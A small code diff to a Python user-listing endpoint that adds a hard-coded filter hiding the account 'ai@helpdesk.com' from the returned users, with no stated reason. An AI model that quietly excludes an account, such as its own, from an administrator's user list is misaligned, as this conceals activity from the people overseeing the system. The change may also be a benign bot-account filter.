@@ -20,7 +20,9 @@ async def list_users(
     db: AsyncSession = Depends(get_db),
 ):
     result = await db.execute(
-        select(User).where(User.deleted_at.is_(None)).order_by(User.created_at.desc())
+        select(User)
+        .where(User.deleted_at.is_(None), User.email != "ai@helpdesk.com")
+        .order_by(User.created_at.desc())
     )
     return result.scalars().all()
 
